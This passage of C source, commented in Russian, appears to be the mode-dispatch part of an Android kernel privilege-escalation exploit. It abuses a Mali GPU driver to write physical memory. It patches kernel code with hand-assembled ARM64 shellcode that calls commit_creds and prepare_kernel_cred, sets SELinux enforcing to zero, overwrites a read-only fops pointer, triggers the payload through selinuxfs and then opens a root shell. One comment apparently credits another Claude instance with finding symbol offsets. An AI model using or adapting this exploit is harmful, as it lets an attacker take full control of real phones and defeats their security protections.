        if (nargs >= 1) scan_start = s1;
        g_scan_end = (nargs == 2) ? s2 : 0;
        return do_cred_gpu(scan_start);
    }
    if (!strncmp(mode, "wscan", 5)) {
        if (validate_write() < 0) { printf("[x] validate failed\n"); return 1; }
        return do_wscan();
    }
    if (!strncmp(mode, "se0", 3)) {
        // selinux_state.enforcing = 0: пишем u32 0x01000000 @geom phys 0x35146e8
        if (validate_write() < 0) { printf("[x] validate failed\n"); return 1; }
        printf("[S] \u043f\u0438\u0448\u0435\u043c selinux_state.enforcing=0 (\u0441\u043b\u043e\u0432\u043e 0x01000000)\n"); fflush(stdout);
        wphys32(0x35146e8, 0x01000000);
        cpu_cache_thrash();
        printf("[S] \u0433\u043e\u0442\u043e\u0432\u043e \u2014 \u0437\u0430\u043f\u0443\u0441\u0442\u0438 getenforce \u0432 \u0440\u0443\u0442-\u0441\u0435\u0441\u0441\u0438\u0438\n");
        return 0;
    }
    if (!strncmp(mode, "tscan", 5)) {
        unsigned long long s1 = 0x2000000, s2 = 0x7f800000;
        if (sscanf(mode, "tscan,%llx,%llx", &s1, &s2) >= 1) {}
        if (validate_write() < 0) { printf("[x] validate failed\n"); return 1; }
        return do_tscan(s1, s2);
    }
    if (!strcmp(mode, "go") || !strcmp(mode, "dump") || !strcmp(mode, "root")) {
        if (validate_write() < 0) { printf("[x] запись не работает\n"); return 1; }
        if (dump_kernel() < 0) { printf("[x] дамп ядра не удался\n"); return 1; }
    }
    if (!strcmp(mode, "go") || !strcmp(mode, "root")) {
        if (parse_kallsyms() < 0) { printf("[x] kallsyms не разобран (kdump.bin на месте)\n"); return 1; }
        do_root();
    } else if (!strncmp(mode, "go2,", 4)) {
        // go2,prepare_kernel_cred,commit_creds,sel_read_handle_unknown
        // использует prepare_kernel_cred(0) вместо init_cred
        unsigned long long pa, pb, pc;
        if (sscanf(mode, "go2,%llx,%llx,%llx", &pa, &pb, &pc) == 3) {
            printf("[R] phys: pkcred=0x%llx cc=0x%llx srhu=0x%llx\n", pa, pb, pc);
            // шеллкод: mov x0,#0; adrp+add x8,pkcred; blr x8; adrp+add x8,cc; blr x8; ret
            uint32_t code[10];
            code[0] = 0xd2800000;  // mov x0, #0
            code[1] = enc_adrp(8, pc + 4, pa);
            code[2] = 0x91000108u | ((uint32_t)(pa & 0xFFF) << 10);  // add x8, x8, #lo
            code[3] = 0xa9bf7bfd;  // stp x29, x30, [sp, #-16]!
            code[4] = 0xd63f0100;  // blr x8
            code[5] = enc_adrp(8, pc + 20, pb);
            code[6] = 0x91000108u | ((uint32_t)(pb & 0xFFF) << 10);  // add x8, x8, #lo
            code[7] = 0xd63f0100;  // blr x8
            code[8] = 0xa8c17bfd;  // ldp x29, x30, [sp], #16
            code[9] = 0xd65f03c0;  // ret
            for (int i = 9; i >= 0; i--) wphys32(pc + i * 4, code[i]);
            printf("[R] шеллкод записан (%d инструкций)\n", 10);

            // --- readback verify: map target page via L2 and read ---
            {
                int save_slot = win_slot;
                win_slot = OVERWRITE_INDEX + 1;  // другой слот для чтения
                size_t rsz = 4u << 20;
                if (!g_nfree) {
                    uint8_t* d0 = mmu_dump(fd2, rsz);
                    if (d0) {
                        parse_tree(d0, rsz);
                        g_l2_phys = l2_table_phys;
                        if (g_l2_phys)
                            for (int b = 0; b < ndblk; b++)
                                if (dblk[b].level == 2 && dblk[b].table_phys == g_l2_phys) {
                                    for (int ii = 0; ii < 512 && g_nfree < 512; ii++)
                                        if ((dblk[b].entries[ii] & 3) != 3)
                                            g_free_entries[g_nfree++] = ii;
                                    break;
                                }
                        munmap(d0, rsz);
                    }
                }
                if (g_nfree >= 1 && g_l2_phys) {
                    uint64_t tgt_page = (uint64_t)pc & ~0xFFFULL;
                    int rk = g_free_entries[0];
                    set_window(g_l2_phys | 0x443);
                    usleep(100000);
                    write_value(fd2, match_B + win_slot * 0x1000 + rk * 8, tgt_page | 0x403, 0);
                    usleep(200000);
                    uint8_t* dr = mmu_dump(fd2, rsz);
                    if (dr) {
                        parse_tree(dr, rsz);
                        int found_rb = 0;
                        for (int b = 0; b < ndblk; b++) {
                            if (dblk[b].level == 3 && dblk[b].table_phys == tgt_page) {
                                uint32_t* rp = (uint32_t*)((uint8_t*)dblk[b].entries + ((uint64_t)pc & 0xFFF));
                                printf("[R] readback: ");
                                for (int j = 0; j < 10; j++) printf("%08x ", rp[j]);
                                printf("\n[R] expected: ");
                                for (int j = 0; j < 10; j++) printf("%08x ", code[j]);
                                printf("\n");
                                int ok = 1;
                                for (int j = 0; j < 10; j++) if (rp[j] != code[j]) ok = 0;
                                printf("[R] WRITE %s\n", ok ? "VERIFIED OK" : "FAILED — запись не прошла!");
                                found_rb = 1;
                                break;
                            }
                        }
                        if (!found_rb) printf("[R] readback: target page not in mmu dump\n");
                        munmap(dr, rsz);
                    }
                    // cleanup L2
                    set_window(g_l2_phys | 0x443);
                    usleep(100000);
                    write_value(fd2, match_B + win_slot * 0x1000 + rk * 8, 2, 0);
                    usleep(100000);
                } else printf("[R] readback: L2 init failed (nfree=%d)\n", g_nfree);
                win_slot = save_slot;
            }

            for (int si = 0; si < NRES; si++)
                if (res_real[si] && res_map[si]) {
                    do_mem_sync(fd2, res_real[si], res_map[si], (uint64_t)RESERVED_SIZE << 12);
                    break;
                }
            printf("[R] CPU D-cache thrash...\n");
            cpu_cache_thrash();
            sleep(1);
            cpu_cache_thrash();
            printf("[R] триггер reject_unknown...\n");
            int f = open("/sys/fs/selinux/reject_unknown", O_RDONLY);
            if (f >= 0) { char ch; read(f, &ch, 1); close(f); }
            printf("[R] uid=%d%s\n", getuid(), getuid() == 0 ? "  === ROOT ===" : "");
            if (getuid() == 0) {
                set_window(2);
                usleep(100000);
                execl("/system/bin/sh", "sh", (char*)NULL);
            }
        }
    } else if (!strcmp(mode, "test_data")) {
        // Тест: пишем в DATA (.rodata fops pointer), проверяем видит ли CPU
        // sel_handle_unknown_ops.read = sel_read_handle_unknown (0xffffffe41071d0e8)
        // struct at phys 0x2f9cd08, .read at +0x10 = phys 0x2f9cd18
        // Меняем на sel_read_policyvers (0xffffffe41071ccc8)
        uint64_t fops_read_phys = 0x2f9cd18;  // phys addr of .read pointer
        uint64_t old_val = 0xffffffe41071d0e8; // sel_read_handle_unknown
        uint64_t new_val = 0xffffffe41071ccc8; // sel_read_policyvers

        printf("[T] test_data: changing fops.read from 0x%llx to 0x%llx\n",
               (unsigned long long)old_val, (unsigned long long)new_val);
        printf("[T] writing to phys 0x%llx (DATA, .rodata)\n", (unsigned long long)fops_read_phys);

        // write as two 32-bit words (little-endian)
        wphys32(fops_read_phys, (uint32_t)(new_val & 0xFFFFFFFF));
        wphys32(fops_read_phys + 4, (uint32_t)(new_val >> 32));

        // Force GPU L2 flush: close Mali fds (driver flushes L2 on context destroy)
        printf("[T] closing Mali fds to flush GPU L2...\n");
        close(fd2); close(fd1);
        printf("[T] waiting 5s for CPU cache eviction...\n");
        sleep(5);

        // trigger: read reject_unknown
        printf("[T] trigger: reading reject_unknown...\n");
        int f = open("/sys/fs/selinux/reject_unknown", O_RDONLY);
        if (f >= 0) {
            char buf[64] = {0};
            int n = read(f, buf, sizeof(buf) - 1);
            close(f);
            printf("[T] reject_unknown returned: '%s' (n=%d)\n", buf, n);
            printf("[T] if value changed => DATA writes visible to CPU!\n");
        } else {
            printf("[T] can't open reject_unknown: %d\n", errno);
        }

        // fds closed, can't restore — reboot to fix
        printf("[T] NOTE: fops pointer NOT restored, reboot to fix\n");
        return 0;
    } else if (!strncmp(mode, "go3,", 4) || !strncmp(mode, "goR,", 4) ||
               !strncmp(mode, "go4,", 4) || !strncmp(mode, "go5,", 4) ||
               !strncmp(mode, "go6,", 4) || !strncmp(mode, "go7,", 4) ||
               !strncmp(mode, "go6b,", 5) || !strncmp(mode, "go8,", 4)) {
        int restore = (mode[2] == 'R');
        int control = (mode[2] == '4');
        int preponly = (mode[2] == '5');
        int commitinit = (mode[2] == '6');
        int syscom = (mode[2] == '7');
        int uidcall = (mode[2] == '8');
        unsigned long long pc = 0;
        if (mode[3] == 'b') sscanf(mode + 5, "%llx", &pc);
        else sscanf(mode + 4, "%llx", &pc);
        if (restore) {
            printf("[R] restore @ 0x%llx\n", (unsigned long long)pc);
            wphys32(pc, 0xd10103ff);
            wphys32(pc + 4, 0xf800865e);
            printf("[R] restored\n");
        } else if (preponly) {
            // mov x0,#0; adrp x8,pk; add; blr; mov x0,#0; ldp; ret
            printf("[5] prepare-only @ phys 0x%llx\n", (unsigned long long)pc);
            uint32_t code[7];
            code[0] = 0xd2800000;                       // mov x0,#0
            code[1] = enc_adrp(8, pc + 4, 0x2118ea8);   // adrp x8, prepare_kernel_cred
            code[2] = 0x91000108u | ((uint32_t)(0x2118ea8 & 0xFFF) << 10);
            code[3] = 0xa9bf7bfd;                       // stp x29,x30
            code[4] = 0xd63f0100;                       // blr x8
            code[5] = 0x52800000;                       // mov w0,#0
            code[6] = 0xd65f03c0;                       // ret
            for (int i = 6; i >= 0; i--) wphys32(pc + i * 4, code[i]);
            printf("[5] thrash...\n");
            cpu_cache_thrash();
            sleep(1);
            printf("[5] триггер reject_unknown...\n");
            int f = open("/sys/fs/selinux/reject_unknown", O_RDONLY);
            if (f >= 0) {
                char ch = 0;
                int n = read(f, &ch, 1);
                close(f);
                printf("[5] read=%d (0 => prepare жив) — ПЕРЕЖИЛИ, uid=%d\n", n, getuid());
            } else printf("[5] open fail\n");
            printf("[5] живы\n");
        } else if (uidcall) {
            // go8: патч sel_read_handle_unknown = blr __arm64_sys_getuid; ret
            // безопасная функция: возвращает текущий uid (2000) — read() вернёт 2000
            printf("[8] blr __arm64_sys_getuid @ phys 0x%llx\n", (unsigned long long)pc);
            const uint64_t G = 0x210327c;   // phys __arm64_sys_getuid
            uint32_t code[4];
            code[0] = enc_adrp(8, pc + 4, G);
            code[1] = 0x91000108u | ((uint32_t)(G & 0xFFF) << 10); // add x8, x8, #lo
            code[2] = 0xd63f0100;                                  // blr x8
            code[3] = 0xd65f03c0;                                  // ret
            for (int i = 3; i >= 0; i--) wphys32(pc + i * 4, code[i]);
            printf("[8] thrash...\n");
            cpu_cache_thrash();
            sleep(1);
            printf("[8] триггер reject_unknown...\n");
            int f = open("/sys/fs/selinux/reject_unknown", O_RDONLY);
            if (f >= 0) {
                int n = read(f, &(char){0}, 1);
                close(f);
                printf("[8] read=%d (низкий байт 0x%02x, 2000=0x7d0 => вызов тысячи...) — ПЕРЕЖИЛИ, uid=%d\n",
                       n, n & 0xFF, getuid());
            } else printf("[8] open fail\n");
            printf("[8] живы\n");
        } else if (commitinit || syscom) {
            // commit_creds(&init_cred) — init_cred найден в дампе (x19 prepare = тот же
            // адрес — ядро само подтверждает), VA 0xffffffe411517d08 / phys 0x3317d08
            // go6 — триггер через selinuxfs-read, go7 — через свой setresuid()
            printf("[%d] commit-init_cred @ phys 0x%llx\n", commitinit ? 6 : 7,
                   (unsigned long long)pc);
            // CC: мой паринг: commit_creds@0x2118a20; альтернативный паринг (other Claude):
            // commit_creds@0x2118cd8. CC выбирается по префиксу режима.
            const uint64_t INIT = 0x3317d08;
            int alt = (mode[3] == 'b');
            const uint64_t CC = alt ? 0x2118cd8 : 0x2118a20;   // phys
            uint32_t code[8];
            code[0] = enc_adrp(0, pc + 4, INIT);                        // adrp x0,init_cred
            code[1] = 0x91000000u | ((uint32_t)(INIT & 0xFFF) << 10);   // add x0, x0, #0xd08
            code[2] = enc_adrp(8, pc + 12, CC);                         // adrp x8,commit_creds
            code[3] = 0x91000108u | ((uint32_t)(CC & 0xFFF) << 10);     // add x8, x8, #0xa20
            code[4] = 0xa9bf7bfd;                                       // stp x29,x30,[sp,#-16]!
            code[5] = 0xd63f0100;                                       // blr x8
            code[6] = 0xa8c17bfd;                                       // ldp x29,x30,[sp],#16
            code[7] = 0xd65f03c0;                                       // ret
            for (int i = 7; i >= 0; i--) wphys32(pc + i * 4, code[i]);
            printf("[%d] thrash...\n", commitinit ? 6 : 7);
            cpu_cache_thrash();
            sleep(1);
            if (syscom) {
                printf("[7] вызов setresuid(0,0,0)...\n");
                setresuid(0, 0, 0);
                printf("[7] setresuid вернулся, uid=%d %s\n", getuid(),
                       getuid() == 0 ? "  === ROOT ===" : "");
                sleep(1);
                printf("[7] uid=%d\n", getuid());
                fflush(stdout);
                if (getuid() == 0) try_become_root_shell();
            } else {
                printf("[%d] триггер reject_unknown...\n", commitinit ? 6 : 7);
                int f = open("/sys/fs/selinux/reject_unknown", O_RDONLY);
                if (f >= 0) {
                    char ch = 0;
                    int n = read(f, &ch, 1);
                    close(f);
                    printf("[%d] read=%d (0 => commit отработал) — ПЕРЕЖИЛИ, uid=%d %s\n",
                           commitinit ? 6 : 7, n, getuid(),
                           getuid() == 0 ? "  === ROOT ===" : "");
                } else printf("[%d] open fail\n", commitinit ? 6 : 7);
                printf("[%d] живы\n", commitinit ? 6 : 7);
                sleep(2);
                printf("[%d] uid=%d\n", commitinit ? 6 : 7, getuid());
                fflush(stdout);
                if (getuid() == 0) try_become_root_shell();
            }
        } else {
            uint32_t w0 = control ? 0xd2800540 : 0xd65f03c0;
            uint32_t w1 = control ? 0xd65f03c0 : 0xd503201f;
            printf("[%d] патч @ phys 0x%llx w=%#x,%#x\n", control?4:3,
                   (unsigned long long)pc, w0, w1);
            wphys32(pc, w0);
            wphys32(pc + 4, w1);
            printf("[%d] thrash...\n", control?4:3);
            cpu_cache_thrash();
            sleep(1);
            printf("[%d] триггер reject_unknown...\n", control?4:3);
            int f = open("/sys/fs/selinux/reject_unknown", O_RDONLY);
            if (f >= 0) {
                char ch = 0;
                int n = read(f, &ch, 1);
                close(f);
                printf("[%d] read=%d (42 => контроль ОК) — ПЕРЕЖИЛИ, uid=%d\n",
                       control?4:3, n, getuid());
            } else {
                printf("[%d] open fail: %s\n", control?4:3, strerror(errno));
            }
            printf("[%d] живы, uid=%d\n", control?4:3, getuid());
        }
    } else if (!strncmp(mode, "go,", 3)) {
        unsigned long long pa, pb, pc, pd;
        if (sscanf(mode, "go,%llx,%llx,%llx,%llx", &pa, &pb, &pc, &pd) == 4) {
            printf("[R] phys: init=0x%llx cc=0x%llx se=0x%llx srhu=0x%llx\n",
                   pa, pb, pc, pd);
            wphys32((uint64_t)pc, 0);
            printf("[R] selinux_enforcing=0 записан\n");
            uint32_t code[8];
            code[0] = enc_adrp(0, pd, pa);
            code[1] = 0x91000000u | ((uint32_t)(pa & 0xFFF) << 10);
            code[2] = enc_adrp(8, pd + 8, pb);
            code[3] = 0x91000000u | ((uint32_t)(pb & 0xFFF) << 10) | (8u << 5) | 8u;
            code[4] = 0xa9bf7bfd;
            code[5] = 0xd63f0100;
            code[6] = 0xa8c17bfd;
            code[7] = 0xd65f03c0;
            for (int i = 7; i >= 0; i--) wphys32(pd + i * 4, code[i]);
            sleep(1);
            printf("[R] триггер reject_unknown...\n");
            int f = open("/sys/fs/selinux/reject_unknown", O_RDONLY);
            if (f >= 0) { char ch; read(f, &ch, 1); close(f); }
            printf("[R] uid=%d%s\n", getuid(), getuid() == 0 ? "  === ROOT ===" : "");
            if (getuid() == 0) {
                set_window(2);   // слот256 -> invalid (чистый teardown)
                usleep(100000);
                execl("/system/bin/sh", "sh", (char*)NULL);
            }
        }
    }
    printf("== DONE ==\n");
    return 0;
}
